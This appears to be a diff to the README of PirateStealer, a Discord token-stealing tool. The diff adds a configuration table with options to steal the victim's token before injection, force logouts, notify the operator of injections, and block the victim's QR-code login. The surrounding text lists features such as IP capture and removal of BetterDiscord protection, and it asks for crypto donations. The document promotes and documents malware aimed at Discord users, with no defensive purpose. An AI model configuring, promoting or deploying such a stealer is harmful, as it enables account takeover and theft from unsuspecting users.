@@ -7,7 +7,7 @@
 - [Login Showcase](https://github.com/bytixo/PirateStealer#login)
 - [Password Changed Showcase](https://github.com/bytixo/PirateStealer#changed-password)
 - [Key Features](https://github.com/bytixo/PirateStealer#features)
-
+- [Configuration](https://github.com/bytixo/PirateStealer#configuration)
 
 ## Skids hall 
 (changing embed colour and removing PirateStealer mention doesnt make your grabber selfcoded dumbass)
@@ -111,6 +111,18 @@ Doge: `D5yxhkGnMhFPauc9zeARtLdJNp4j7LB87U`
 - IP
 - Remove QR Code
 - BetterDiscord Protection Remover
+
+# Configuration
+|            Name | Description                                                                                                                                          | Example     | Type    |
+|----------------:|------------------------------------------------------------------------------------------------------------------------------------------------------|-------------|---------|
+| platform        | An array containing all the platforms you want your grabber to work on.                                                                              | ["windows"] | array   |
+| logout          | False: Do not log out True: Disconnect the next time you launch Discord Instant: Kill Discord and ask to reconnect                                   | "instant"   | boolean |
+| steal-token     | False: Do not send token before injection True: Send token before injection                                                                          | "true"      | boolean |
+| inject-notify   | False: Does not send a message when the grabber has successfully injected True: Send a message when the grabber has successfully injected            | "true"      | boolean |
+| logout-notify   | False: Does not send a message when the victim has successfully logged out True: Send a message when the victim has successfully logged out          | "false"     | boolean |
+| init-notify     | False: Does not send a message when the grabber has been initialized in the victim discord client True: Send the message                             | "false"     | boolean |
+| embed-color     | The embed color in hex.                                                                                                                              | "3447704"   | string  |
+| disable-qr-code | False: The victim will have access to the authentication QRCode (not recommended) True: The victim will not have access to the authentication QRCode | "true"      | boolean |
 
 # How to contribute
 For contribute, make a [pull request](https://github.com/Stanley-GF/PirateStealer/pulls) or open an [issue](https://github.com/Stanley-GF/PirateStealer/issues) with your codes
